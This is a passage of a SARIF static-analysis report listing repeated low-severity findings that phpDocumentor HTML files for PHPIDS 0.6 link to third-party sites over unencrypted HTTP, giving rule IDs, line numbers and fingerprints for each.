            "uri" : "external/phpids/0.6/docs/phpdocumentor/PHPIDS/_Log---Composite.php.html"
          },
          "region" : {
            "startLine" : 31,
            "endLine" : 31,
            "startColumn" : 1,
            "endColumn" : 80
          }
        }
      } ],
      "codeFlows" : [ {
        "threadFlows" : [ {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "_Log---Composite.php.html:31"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/docs/phpdocumentor/PHPIDS/_Log---Composite.php.html"
                },
                "region" : {
                  "startLine" : 31
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "_Log---Composite.php.html:31"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/docs/phpdocumentor/PHPIDS/_Log---Composite.php.html"
                },
                "region" : {
                  "startLine" : 31
                }
              }
            }
          } ]
        } ]
      } ]
    }, {
      "ruleId" : "4411",
      "message" : {
        "text" : "The file _Log---Composite.php.html on line 90 links to a third-party site over an unencrypted channel.\n\n\n"
      },
      "level" : "note",
      "partialFingerprints" : {
        "issueInstanceId" : "1E3DCDFDA9CE641A84F0CAD5F87D6B86"
      },
      "locations" : [ {
        "physicalLocation" : {
          "artifactLocation" : {
            "uri" : "external/phpids/0.6/docs/phpdocumentor/PHPIDS/_Log---Composite.php.html"
          },
          "region" : {
            "startLine" : 90,
            "endLine" : 90,
            "startColumn" : 1,
            "endColumn" : 80
          }
        }
      } ],
      "codeFlows" : [ {
        "threadFlows" : [ {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "_Log---Composite.php.html:90"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/docs/phpdocumentor/PHPIDS/_Log---Composite.php.html"
                },
                "region" : {
                  "startLine" : 90
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "_Log---Composite.php.html:90"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/docs/phpdocumentor/PHPIDS/_Log---Composite.php.html"
                },
                "region" : {
                  "startLine" : 90
                }
              }
            }
          } ]
        } ]
      } ]
    }, {
      "ruleId" : "4412",
      "message" : {
        "text" : "The file _Log---Composite.php.html on line 91 links to a third-party site over an unencrypted channel.\n\n\n"
      },
      "level" : "note",
      "partialFingerprints" : {
        "issueInstanceId" : "1E3DCDFDA9CE641A84F0CAD5F87D6B87"
      },
      "locations" : [ {
        "physicalLocation" : {
          "artifactLocation" : {
            "uri" : "external/phpids/0.6/docs/phpdocumentor/PHPIDS/_Log---Composite.php.html"
          },
          "region" : {
            "startLine" : 91,
            "endLine" : 91,
            "startColumn" : 1,
            "endColumn" : 80
          }
        }
      } ],
      "codeFlows" : [ {
        "threadFlows" : [ {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "_Log---Composite.php.html:91"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/docs/phpdocumentor/PHPIDS/_Log---Composite.php.html"
                },
                "region" : {
                  "startLine" : 91
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "_Log---Composite.php.html:91"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/docs/phpdocumentor/PHPIDS/_Log---Composite.php.html"
                },
                "region" : {
                  "startLine" : 91
                }
              }
            }
          } ]
        } ]
      } ]
    }, {
      "ruleId" : "4413",
      "message" : {
        "text" : "The file _Log---Composite.php.html on line 102 links to a third-party site over an unencrypted channel.\n\n\n"
      },
      "level" : "note",
      "partialFingerprints" : {
        "issueInstanceId" : "1E3DCDFDA9CE641A84F0CAD5F87D6B88"
      },
      "locations" : [ {
        "physicalLocation" : {
          "artifactLocation" : {
            "uri" : "external/phpids/0.6/docs/phpdocumentor/PHPIDS/_Log---Composite.php.html"
          },
          "region" : {
            "startLine" : 102,
            "endLine" : 102,
            "startColumn" : 1,
            "endColumn" : 80
          }
        }
      } ],
      "codeFlows" : [ {
        "threadFlows" : [ {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "_Log---Composite.php.html:102"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/docs/phpdocumentor/PHPIDS/_Log---Composite.php.html"
                },
                "region" : {
                  "startLine" : 102
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "_Log---Composite.php.html:102"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/docs/phpdocumentor/PHPIDS/_Log---Composite.php.html"
                },
                "region" : {
                  "startLine" : 102
                }
              }
            }
          } ]
        } ]
      } ]
    }, {
      "ruleId" : "4498",
      "message" : {
        "text" : "The file _Log---Database.php.html on line 30 links to a third-party site over an unencrypted channel.\n\n\n"
      },
      "level" : "note",
      "partialFingerprints" : {
        "issueInstanceId" : "5B2A9AD6D6E61D9E37EA2C027AFC78A2"
      },
      "locations" : [ {
        "physicalLocation" : {
          "artifactLocation" : {
            "uri" : "external/phpids/0.6/docs/phpdocumentor/PHPIDS/_Log---Database.php.html"
          },
          "region" : {
            "startLine" : 30,
            "endLine" : 30,
            "startColumn" : 1,
            "endColumn" : 80
          }
        }
      } ],
      "codeFlows" : [ {
        "threadFlows" : [ {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "_Log---Database.php.html:30"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/docs/phpdocumentor/PHPIDS/_Log---Database.php.html"
                },
                "region" : {
                  "startLine" : 30
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "_Log---Database.php.html:30"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/docs/phpdocumentor/PHPIDS/_Log---Database.php.html"
                },
                "region" : {
                  "startLine" : 30
                }
              }
            }
          } ]
        } ]
      } ]
    }, {
      "ruleId" : "4499",
      "message" : {
        "text" : "The file _Log---Database.php.html on line 31 links to a third-party site over an unencrypted channel.\n\n\n"
      },
      "level" : "note",
      "partialFingerprints" : {
        "issueInstanceId" : "5B2A9AD6D6E61D9E37EA2C027AFC78A3"
      },
      "locations" : [ {
        "physicalLocation" : {
          "artifactLocation" : {
            "uri" : "external/phpids/0.6/docs/phpdocumentor/PHPIDS/_Log---Database.php.html"
          },
          "region" : {
            "startLine" : 31,
            "endLine" : 31,
            "startColumn" : 1,
            "endColumn" : 80
          }
        }
      } ],
      "codeFlows" : [ {
        "threadFlows" : [ {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "_Log---Database.php.html:31"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/docs/phpdocumentor/PHPIDS/_Log---Database.php.html"
                },
                "region" : {
                  "startLine" : 31
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "_Log---Database.php.html:31"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/docs/phpdocumentor/PHPIDS/_Log---Database.php.html"
                },
                "region" : {
                  "startLine" : 31
                }
              }
            }
          } ]
        } ]
      } ]
    }, {
      "ruleId" : "4500",
      "message" : {
        "text" : "The file _Log---Database.php.html on line 90 links to a third-party site over an unencrypted channel.\n\n\n"
      },
      "level" : "note",
      "partialFingerprints" : {
        "issueInstanceId" : "5B2A9AD6D6E61D9E37EA2C027AFC78A4"
      },
      "locations" : [ {
        "physicalLocation" : {
          "artifactLocation" : {
            "uri" : "external/phpids/0.6/docs/phpdocumentor/PHPIDS/_Log---Database.php.html"
          },
          "region" : {
            "startLine" : 90,
            "endLine" : 90,
            "startColumn" : 1,
            "endColumn" : 80
          }
        }
      } ],
      "codeFlows" : [ {
        "threadFlows" : [ {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "_Log---Database.php.html:90"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/docs/phpdocumentor/PHPIDS/_Log---Database.php.html"
                },
                "region" : {
                  "startLine" : 90
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "_Log---Database.php.html:90"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/docs/phpdocumentor/PHPIDS/_Log---Database.php.html"
                },
                "region" : {
                  "startLine" : 90
                }
              }
            }
          } ]
        } ]
      } ]
    }, {
      "ruleId" : "4501",
      "message" : {
        "text" : "The file _Log---Database.php.html on line 91 links to a third-party site over an unencrypted channel.\n\n\n"
      },
      "level" : "note",
      "partialFingerprints" : {
        "issueInstanceId" : "5B2A9AD6D6E61D9E37EA2C027AFC78A5"
      },
      "locations" : [ {
        "physicalLocation" : {
          "artifactLocation" : {
            "uri" : "external/phpids/0.6/docs/phpdocumentor/PHPIDS/_Log---Database.php.html"
          },
          "region" : {
            "startLine" : 91,
            "endLine" : 91,
            "startColumn" : 1,
            "endColumn" : 80
          }
        }
      } ],
      "codeFlows" : [ {
        "threadFlows" : [ {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "_Log---Database.php.html:91"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/docs/phpdocumentor/PHPIDS/_Log---Database.php.html"
                },
                "region" : {
                  "startLine" : 91
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "_Log---Database.php.html:91"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/docs/phpdocumentor/PHPIDS/_Log---Database.php.html"
                },
                "region" : {
                  "startLine" : 91
                }
              }
            }
          } ]
        } ]
      } ]
    }, {
      "ruleId" : "4502",
      "message" : {
        "text" : "The file _Log---Database.php.html on line 102 links to a third-party site over an unencrypted channel.\n\n\n"
      },
      "level" : "note",
      "partialFingerprints" : {
        "issueInstanceId" : "5B2A9AD6D6E61D9E37EA2C027AFC78A6"
      },
      "locations" : [ {
        "physicalLocation" : {
          "artifactLocation" : {
            "uri" : "external/phpids/0.6/docs/phpdocumentor/PHPIDS/_Log---Database.php.html"
          },
          "region" : {
            "startLine" : 102,
            "endLine" : 102,
            "startColumn" : 1,
            "endColumn" : 80
          }
        }
      } ],
      "codeFlows" : [ {
        "threadFlows" : [ {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "_Log---Database.php.html:102"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/docs/phpdocumentor/PHPIDS/_Log---Database.php.html"
                },
                "region" : {
                  "startLine" : 102
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "_Log---Database.php.html:102"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/docs/phpdocumentor/PHPIDS/_Log---Database.php.html"
                },
                "region" : {
                  "startLine" : 102
                }
              }
            }
          } ]
        } ]
      } ]
    }, {
      "ruleId" : "4376",
      "message" : {
        "text" : "The file _Log---Email.php.html on line 30 links to a third-party site over an unencrypted channel.\n\n\n"
      },
      "level" : "note",
      "partialFingerprints" : {
        "issueInstanceId" : "08BE460E0C201E6212A1A48AC6D23F78"
      },
      "locations" : [ {
        "physicalLocation" : {
          "artifactLocation" : {
            "uri" : "external/phpids/0.6/docs/phpdocumentor/PHPIDS/_Log---Email.php.html"
          },
          "region" : {
            "startLine" : 30,
            "endLine" : 30,
            "startColumn" : 1,
            "endColumn" : 80
          }
        }
      } ],
      "codeFlows" : [ {
        "threadFlows" : [ {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "_Log---Email.php.html:30"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/docs/phpdocumentor/PHPIDS/_Log---Email.php.html"
                },
                "region" : {
                  "startLine" : 30
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "_Log---Email.php.html:30"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/docs/phpdocumentor/PHPIDS/_Log---Email.php.html"
                },
                "region" : {
                  "startLine" : 30
                }
              }
            }
          } ]
        } ]
      } ]
    }, {
      "ruleId" : "4377",
      "message" : {
        "text" : "The file _Log---Email.php.html on line 31 links to a third-party site over an unencrypted channel.\n\n\n"
      },
      "level" : "note",
      "partialFingerprints" : {
        "issueInstanceId" : "08BE460E0C201E6212A1A48AC6D23F79"
      },
      "locations" : [ {
        "physicalLocation" : {
          "artifactLocation" : {
            "uri" : "external/phpids/0.6/docs/phpdocumentor/PHPIDS/_Log---Email.php.html"
          },
          "region" : {
            "startLine" : 31,
            "endLine" : 31,
            "startColumn" : 1,
            "endColumn" : 80
          }
        }
      } ],
      "codeFlows" : [ {
        "threadFlows" : [ {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "_Log---Email.php.html:31"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/docs/phpdocumentor/PHPIDS/_Log---Email.php.html"
                },
                "region" : {
                  "startLine" : 31
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "_Log---Email.php.html:31"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/docs/phpdocumentor/PHPIDS/_Log---Email.php.html"
                },
                "region" : {
                  "startLine" : 31
                }
              }
            }
          } ]
        } ]
      } ]
    }, {
      "ruleId" : "4378",
      "message" : {
        "text" : "The file _Log---Email.php.html on line 90 links to a third-party site over an unencrypted channel.\n\n\n"
      },
      "level" : "note",
      "partialFingerprints" : {
        "issueInstanceId" : "08BE460E0C201E6212A1A48AC6D23F7A"
      },
      "locations" : [ {
        "physicalLocation" : {
          "artifactLocation" : {
            "uri" : "external/phpids/0.6/docs/phpdocumentor/PHPIDS/_Log---Email.php.html"
          },
          "region" : {
            "startLine" : 90,
            "endLine" : 90,
            "startColumn" : 1,
            "endColumn" : 80
          }
        }
      } ],
      "codeFlows" : [ {
        "threadFlows" : [ {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "_Log---Email.php.html:90"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/docs/phpdocumentor/PHPIDS/_Log---Email.php.html"
                },
                "region" : {
                  "startLine" : 90
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "_Log---Email.php.html:90"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/docs/phpdocumentor/PHPIDS/_Log---Email.php.html"
                },
                "region" : {
                  "startLine" : 90
                }
              }
            }
          } ]
        } ]
      } ]
    }, {
      "ruleId" : "4379",
      "message" : {
        "text" : "The file _Log---Email.php.html on line 91 links to a third-party site over an unencrypted channel.\n\n\n"
      },
      "level" : "note",
      "partialFingerprints" : {
        "issueInstanceId" : "08BE460E0C201E6212A1A48AC6D23F7B"
      },
      "locations" : [ {
        "physicalLocation" : {
          "artifactLocation" : {
            "uri" : "external/phpids/0.6/docs/phpdocumentor/PHPIDS/_Log---Email.php.html"
          },
          "region" : {
            "startLine" : 91,
            "endLine" : 91,
            "startColumn" : 1,
            "endColumn" : 80
          }
        }
      } ],
      "codeFlows" : [ {
        "threadFlows" : [ {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "_Log---Email.php.html:91"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/docs/phpdocumentor/PHPIDS/_Log---Email.php.html"
                },
                "region" : {
                  "startLine" : 91
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "_Log---Email.php.html:91"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/docs/phpdocumentor/PHPIDS/_Log---Email.php.html"
                },
                "region" : {
                  "startLine" : 91
                }
              }
            }
          } ]
        } ]
      } ]
    }, {
      "ruleId" : "4380",
      "message" : {
        "text" : "The file _Log---Email.php.html on line 102 links to a third-party site over an unencrypted channel.\n\n\n"
      },
      "level" : "note",
      "partialFingerprints" : {
        "issueInstanceId" : "08BE460E0C201E6212A1A48AC6D23F7C"
      },
      "locations" : [ {
        "physicalLocation" : {
          "artifactLocation" : {
            "uri" : "external/phpids/0.6/docs/phpdocumentor/PHPIDS/_Log---Email.php.html"
          },
          "region" : {
            "startLine" : 102,
            "endLine" : 102,
            "startColumn" : 1,
            "endColumn" : 80
          }
        }
      } ],
      "codeFlows" : [ {
        "threadFlows" : [ {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "_Log---Email.php.html:102"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/docs/phpdocumentor/PHPIDS/_Log---Email.php.html"
                },
                "region" : {
                  "startLine" : 102
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "_Log---Email.php.html:102"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/docs/phpdocumentor/PHPIDS/_Log---Email.php.html"
                },
                "region" : {
                  "startLine" : 102
                }
              }
            }
          } ]
        } ]
      } ]
    }, {
      "ruleId" : "4664",
      "message" : {
        "text" : "The file _Log---File.php.html on line 30 links to a third-party site over an unencrypted channel.\n\n\n"
      },
      "level" : "note",
      "partialFingerprints" : {
        "issueInstanceId" : "C74134B50CA50F9F7401064329653019"
      },
      "locations" : [ {
        "physicalLocation" : {
          "artifactLocation" : {
            "uri" : "external/phpids/0.6/docs/phpdocumentor/PHPIDS/_Log---File.php.html"
          },
          "region" : {
            "startLine" : 30,
            "endLine" : 30,
            "startColumn" : 1,
            "endColumn" : 80
          }
        }
      } ],
      "codeFlows" : [ {
        "threadFlows" : [ {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "_Log---File.php.html:30"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/docs/phpdocumentor/PHPIDS/_Log---File.php.html"
                },
                "region" : {
                  "startLine" : 30
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "_Log---File.php.html:30"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/docs/phpdocumentor/PHPIDS/_Log---File.php.html"
                },
                "region" : {
                  "startLine" : 30
                }
              }
            }
          } ]
        } ]
      } ]
    }, {
      "ruleId" : "4665",
      "message" : {
        "text" : "The file _Log---File.php.html on line 31 links to a third-party site over an unencrypted channel.\n\n\n"
      },
      "level" : "note",
      "partialFingerprints" : {
        "issueInstanceId" : "C74134B50CA50F9F740106432965301A"
      },
      "locations" : [ {
        "physicalLocation" : {
          "artifactLocation" : {
            "uri" : "external/phpids/0.6/docs/phpdocumentor/PHPIDS/_Log---File.php.html"
          },
          "region" : {
            "startLine" : 31,
            "endLine" : 31,
            "startColumn" : 1,
            "endColumn" : 80
          }
        }
      } ],
      "codeFlows" : [ {
        "threadFlows" : [ {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "_Log---File.php.html:31"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/docs/phpdocumentor/PHPIDS/_Log---File.php.html"
                },
                "region" : {
                  "startLine" : 31
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "_Log---File.php.html:31"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/docs/phpdocumentor/PHPIDS/_Log---File.php.html"
                },
                "region" : {
                  "startLine" : 31
                }
              }
            }
          } ]
        } ]
      } ]
    }, {
      "ruleId" : "4666",
      "message" : {
        "text" : "The file _Log---File.php.html on line 90 links to a third-party site over an unencrypted channel.\n\n\n"
      },
      "level" : "note",
      "partialFingerprints" : {
        "issueInstanceId" : "C74134B50CA50F9F740106432965301B"
      },
      "locations" : [ {
        "physicalLocation" : {
          "artifactLocation" : {
            "uri" : "external/phpids/0.6/docs/phpdocumentor/PHPIDS/_Log---File.php.html"
          },
          "region" : {
            "startLine" : 90,
            "endLine" : 90,
            "startColumn" : 1,
            "endColumn" : 80
          }
        }
      } ],
      "codeFlows" : [ {
        "threadFlows" : [ {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "_Log---File.php.html:90"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/docs/phpdocumentor/PHPIDS/_Log---File.php.html"
                },
                "region" : {
                  "startLine" : 90
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "_Log---File.php.html:90"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/docs/phpdocumentor/PHPIDS/_Log---File.php.html"
                },
                "region" : {
                  "startLine" : 90
                }
              }
            }
          } ]
        } ]
      } ]
    }, {
      "ruleId" : "4667",
      "message" : {
        "text" : "The file _Log---File.php.html on line 91 links to a third-party site over an unencrypted channel.\n\n\n"
      },
      "level" : "note",
      "partialFingerprints" : {
        "issueInstanceId" : "C74134B50CA50F9F740106432965301C"
      },
      "locations" : [ {
        "physicalLocation" : {
          "artifactLocation" : {
            "uri" : "external/phpids/0.6/docs/phpdocumentor/PHPIDS/_Log---File.php.html"
          },
          "region" : {
            "startLine" : 91,
            "endLine" : 91,
            "startColumn" : 1,
            "endColumn" : 80
          }
        }
      } ],
      "codeFlows" : [ {
        "threadFlows" : [ {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "_Log---File.php.html:91"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/docs/phpdocumentor/PHPIDS/_Log---File.php.html"
                },
                "region" : {
                  "startLine" : 91
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "_Log---File.php.html:91"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/docs/phpdocumentor/PHPIDS/_Log---File.php.html"
                },
                "region" : {
                  "startLine" : 91
                }
              }
            }
          } ]
        } ]
      } ]
    }, {
      "ruleId" : "4668",
      "message" : {
        "text" : "The file _Log---File.php.html on line 102 links to a third-party site over an unencrypted channel.\n\n\n"
      },
      "level" : "note",
      "partialFingerprints" : {
        "issueInstanceId" : "C74134B50CA50F9F740106432965301D"
      },
      "locations" : [ {
        "physicalLocation" : {
          "artifactLocation" : {
            "uri" : "external/phpids/0.6/docs/phpdocumentor/PHPIDS/_Log---File.php.html"
          },
          "region" : {
            "startLine" : 102,
            "endLine" : 102,
            "startColumn" : 1,
            "endColumn" : 80
          }
        }
      } ],
      "codeFlows" : [ {
        "threadFlows" : [ {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "_Log---File.php.html:102"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/docs/phpdocumentor/PHPIDS/_Log---File.php.html"
                },
                "region" : {
                  "startLine" : 102
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "_Log---File.php.html:102"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/docs/phpdocumentor/PHPIDS/_Log---File.php.html"
                },
                "region" : {
                  "startLine" : 102
                }
              }
            }
          } ]
        } ]
      } ]
    }, {
      "ruleId" : "4421",
      "message" : {
        "text" : "The file _Log---Interface.php.html on line 29 links to a third-party site over an unencrypted channel.\n\n\n"
      },
      "level" : "note",
      "partialFingerprints" : {
        "issueInstanceId" : "23B986EE3DDF939FC9AAC4FE6B1029DB"
      },
      "locations" : [ {
        "physicalLocation" : {
          "artifactLocation" : {
            "uri" : "external/phpids/0.6/docs/phpdocumentor/PHPIDS/_Log---Interface.php.html"
          },
          "region" : {
            "startLine" : 29,
            "endLine" : 29,
            "startColumn" : 1,
            "endColumn" : 80
          }
        }
      } ],
      "codeFlows" : [ {
        "threadFlows" : [ {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "_Log---Interface.php.html:29"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/docs/phpdocumentor/PHPIDS/_Log---Interface.php.html"
                },
                "region" : {
                  "startLine" : 29
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "_Log---Interface.php.html:29"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/docs/phpdocumentor/PHPIDS/_Log---Interface.php.html"
                },
                "region" : {
                  "startLine" : 29
                }
              }
            }
          } ]
        } ]
      } ]
    }, {
      "ruleId" : "4422",
      "message" : {
        "text" : "The file _Log---Interface.php.html on line 30 links to a third-party site over an unencrypted channel.\n\n\n"
      },
      "level" : "note",
      "partialFingerprints" : {
        "issueInstanceId" : "23B986EE3DDF939FC9AAC4FE6B1029DC"
      },
      "locations" : [ {
        "physicalLocation" : {
          "artifactLocation" : {
            "uri" : "external/phpids/0.6/docs/phpdocumentor/PHPIDS/_Log---Interface.php.html"
          },
          "region" : {
            "startLine" : 30,
            "endLine" : 30,
            "startColumn" : 1,
            "endColumn" : 80
          }
        }
      } ],
      "codeFlows" : [ {
        "threadFlows" : [ {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "_Log---Interface.php.html:30"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/docs/phpdocumentor/PHPIDS/_Log---Interface.php.html"
                },
                "region" : {
                  "startLine" : 30
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "_Log---Interface.php.html:30"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/docs/phpdocumentor/PHPIDS/_Log---Interface.php.html"
                },
                "region" : {
                  "startLine" : 30
                }
              }
            }
          } ]
        } ]
      } ]
    }, {
      "ruleId" : "4423",
      "message" : {
        "text" : "The file _Log---Interface.php.html on line 66 links to a third-party site over an unencrypted channel.\n\n\n"
      },
      "level" : "note",
      "partialFingerprints" : {
        "issueInstanceId" : "23B986EE3DDF939FC9AAC4FE6B1029DD"
      },
      "locations" : [ {
        "physicalLocation" : {
          "artifactLocation" : {
            "uri" : "external/phpids/0.6/docs/phpdocumentor/PHPIDS/_Log---Interface.php.html"
          },
          "region" : {
            "startLine" : 66,
            "endLine" : 66,
            "startColumn" : 1,
            "endColumn" : 80
          }
        }
      } ],
      "codeFlows" : [ {
        "threadFlows" : [ {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "_Log---Interface.php.html:66"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/docs/phpdocumentor/PHPIDS/_Log---Interface.php.html"
                },
                "region" : {
                  "startLine" : 66
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "_Log---Interface.php.html:66"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/docs/phpdocumentor/PHPIDS/_Log---Interface.php.html"
                },
                "region" : {
                  "startLine" : 66
                }
              }
            }
          } ]
        } ]
      } ]
    }, {
      "ruleId" : "4524",
      "message" : {
        "text" : "The file _Monitor.php.html on line 29 links to a third-party site over an unencrypted channel.\n\n\n"
      },
      "level" : "note",
      "partialFingerprints" : {
        "issueInstanceId" : "66F75F09667E4CFD81A05444FF43103D"
      },
      "locations" : [ {
        "physicalLocation" : {
          "artifactLocation" : {
            "uri" : "external/phpids/0.6/docs/phpdocumentor/PHPIDS/_Monitor.php.html"
          },
          "region" : {
            "startLine" : 29,
            "endLine" : 29,
            "startColumn" : 1,
            "endColumn" : 80
          }
        }
      } ],
      "codeFlows" : [ {
        "threadFlows" : [ {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "_Monitor.php.html:29"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/docs/phpdocumentor/PHPIDS/_Monitor.php.html"
                },
                "region" : {
                  "startLine" : 29
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "_Monitor.php.html:29"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/docs/phpdocumentor/PHPIDS/_Monitor.php.html"
                },
                "region" : {
                  "startLine" : 29
                }
              }
            }
          } ]
        } ]
      } ]
    }, {
      "ruleId" : "4525",
      "message" : {
        "text" : "The file _Monitor.php.html on line 30 links to a third-party site over an unencrypted channel.\n\n\n"
      },
      "level" : "note",
      "partialFingerprints" : {
        "issueInstanceId" : "66F75F09667E4CFD81A05444FF43103E"
      },
      "locations" : [ {
        "physicalLocation" : {
          "artifactLocation" : {
            "uri" : "external/phpids/0.6/docs/phpdocumentor/PHPIDS/_Monitor.php.html"
          },
          "region" : {
            "startLine" : 30,
            "endLine" : 30,
            "startColumn" : 1,
            "endColumn" : 80
          }
        }
      } ],
      "codeFlows" : [ {
        "threadFlows" : [ {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "_Monitor.php.html:30"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/docs/phpdocumentor/PHPIDS/_Monitor.php.html"
                },
                "region" : {
                  "startLine" : 30
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "_Monitor.php.html:30"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/docs/phpdocumentor/PHPIDS/_Monitor.php.html"
                },
                "region" : {
                  "startLine" : 30
                }
              }
            }
          } ]
        } ]
      } ]
    }, {
      "ruleId" : "4526",
      "message" : {
        "text" : "The file _Monitor.php.html on line 66 links to a third-party site over an unencrypted channel.\n\n\n"
      },
      "level" : "note",
      "partialFingerprints" : {
        "issueInstanceId" : "66F75F09667E4CFD81A05444FF43103F"
      },
      "locations" : [ {
        "physicalLocation" : {
          "artifactLocation" : {
            "uri" : "external/phpids/0.6/docs/phpdocumentor/PHPIDS/_Monitor.php.html"
          },
          "region" : {
            "startLine" : 66,
            "endLine" : 66,
            "startColumn" : 1,
            "endColumn" : 80
          }
        }
      } ],
      "codeFlows" : [ {
        "threadFlows" : [ {
          "locations" : [ {
